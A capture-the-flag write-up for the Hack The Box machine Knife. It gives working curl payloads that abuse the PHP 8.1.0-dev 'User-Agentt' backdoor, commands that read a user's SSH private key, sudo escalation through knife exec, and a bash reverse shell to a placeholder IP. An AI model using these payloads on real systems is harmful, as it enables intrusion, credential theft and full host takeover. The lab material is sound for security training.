# Hack The Box: Knife Writeup

<p align="center">
  <img src="https://img.shields.io/badge/HTB-Knife-red?style=for-the-badge&logo=hackthebox&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Attack-RCE-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Privilege%20Escalation-Sudo-important?style=for-the-badge">
</p>

https://app.hackthebox.com/machines/Knife?sort_by=created_at&sort_type=desc
---

# 📚 Table of Contents

- [Overview](#-overview)
- [Reconnaissance](#-reconnaissance)
  - [Nmap Scan](#nmap-scan)
  - [PHP Version Discovery](#php-version-discovery)
- [Initial Foothold](#-initial-foothold)
  - [PHP 8.1.0-dev Backdoor](#php-810-dev-backdoor)
  - [Remote Code Execution](#remote-code-execution)
  - [User Enumeration](#user-enumeration)
  - [User Flag](#user-flag)
- [Privilege Escalation](#-privilege-escalation)
  - [Sudo Permissions](#sudo-permissions)
  - [Abusing knife](#abusing-knife)
  - [Root Shell](#root-shell)
- [Conclusion](#-conclusion)

---

# 🎯 Overview

| Machine | OS | Difficulty |
|----------|----|------------|
| Knife | Linux | Easy |

## Description

This machine demonstrates:
- vulnerable PHP development builds,
- remote code execution through malicious HTTP headers,
- Linux enumeration,
- sudo privilege escalation through `knife`.

The foothold relies on a well-known backdoor introduced in `PHP 8.1.0-dev`.

---

# 🔎 Reconnaissance

## Nmap Scan

Initial scan:

```bash
nmap -sC -sV 10.129.40.4 -oN scan.txt
```

### Result

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh
80/tcp open  http
```

### Observations

- SSH service exposed on port 22.
- HTTP service running on port 80.
- Web enumeration required.

---

## PHP Version Discovery

To identify the PHP version:

```bash
curl -I http://10.129.40.4
```

### Result

```text
PHP/8.1.0-dev
```

This immediately stands out because `PHP 8.1.0-dev` was affected by a malicious backdoor added to the source code repository in March 2021.

---

# 🚀 Initial Foothold

## PHP 8.1.0-dev Backdoor

The compromised version of PHP allows remote code execution through the HTTP header:

```text
User-Agentt
```

⚠️ Important:
- The header contains **two "t" characters**.
- Commands are executed when the value begins with:

```text
zerodium
```

---

## Remote Code Execution

Testing command execution:

```bash
curl -H "User-Agentt: zerodiumsystem('id');" http://10.129.40.4
```

### Result

```text
uid=1000(james) gid=1000(james) groups=1000(james)
```

Remote code execution was confirmed.

---

## User Enumeration

### Home Directory Listing

```bash
curl -H "User-Agentt: zerodiumsystem('ls -la /home');" http://10.129.40.4
```

### Result

```text
drwxr-xr-x 5 james james 4096 May 18 2021 james
```

The target user is:

```text
james
```

---

### Enumerating User Files

```bash
curl -H "User-Agentt: zerodiumsystem('ls -la /home/james');" http://10.129.40.4
```

### Result

```text
-r-------- 1 james james 33 May 5 19:39 user.txt
drwx------ 2 james james 4096 May 18 2021 .ssh
```

---

## User Flag

Reading the user flag:

```bash
curl -H "User-Agentt: zerodiumsystem('cat /home/james/user.txt');" http://10.129.40.4
```

### Result

```text
[USERFLAG]
```

---

## SSH Enumeration

### Enumerating `.ssh`

```bash
curl -H "User-Agentt: zerodiumsystem('ls -la /home/james/.ssh');" http://10.129.40.4
```

### Result

```text
-rw------- 1 james james 3381 May  7 2021 id_rsa
-rw-r--r-- 1 james james  741 May  7 2021 id_rsa.pub
```

A private SSH key was discovered.

---

## Retrieving the Private Key

```bash
curl -H "User-Agentt: zerodiumsystem('cat /home/james/.ssh/id_rsa');" http://10.129.40.4
```

The key was saved locally:

```bash
nano id_rsa
chmod 600 id_rsa
```

SSH connection attempt:

```bash
ssh -i id_rsa james@10.129.40.4
```

### Result

```text
Permission denied (publickey,password)
```

The private key exists but is not authorized for SSH access.

---

# 🔺 Privilege Escalation

## Sudo Permissions

Checking sudo rights:

```bash
curl -H "User-Agentt: zerodiumsystem('sudo -l');" http://10.129.40.4
```

### Result

```text
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

The user can execute:

```text
/usr/bin/knife
```

as root without a password.

---

## Abusing knife

`knife` supports arbitrary Ruby code execution through:

```text
knife exec
```

Testing command execution:

```bash
curl -H 'User-Agentt: zerodiumsystem("sudo knife exec -E '\''system(\"id\")'\''");' http://10.129.40.4
```

### Result

```text
uid=0(root) gid=0(root) groups=0(root)
```

Root command execution confirmed.

---

## Root Shell

### Listener

```bash
nc -lvnp 4444
```

### Reverse Shell Payload

```bash
curl -H 'User-Agentt: zerodiumsystem("sudo knife exec -E '\''exec \"bash -c \\\"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\\\"\"'\''");' http://10.129.40.4
```

### Result

```text
root@knife:/#
```

Verifying privileges:

```bash
whoami
```

### Result

```text
root
```

---

## Root Flag

```bash
cat /root/root.txt
```

### Result

```text
[ROOT FLAG]
```

---

# 🧠 Conclusion

This machine demonstrates a full attack chain involving:

1. Enumeration of a vulnerable PHP development version.
2. Exploitation of the `PHP 8.1.0-dev` backdoor.
3. Remote code execution through the malicious `User-Agentt` header.
4. Linux enumeration and credential discovery.
5. Privilege escalation through misconfigured sudo permissions on `knife`.

---

# 🛠️ Tools Used

- Nmap
- Curl
- Netcat
- SSH
- Linux command line

---

# 📌 Key Takeaways

- Never expose development builds in production environments.
- Restrict sudo permissions carefully.
- Audit third-party tools allowing code execution.
- Monitor unusual HTTP headers during security reviews.
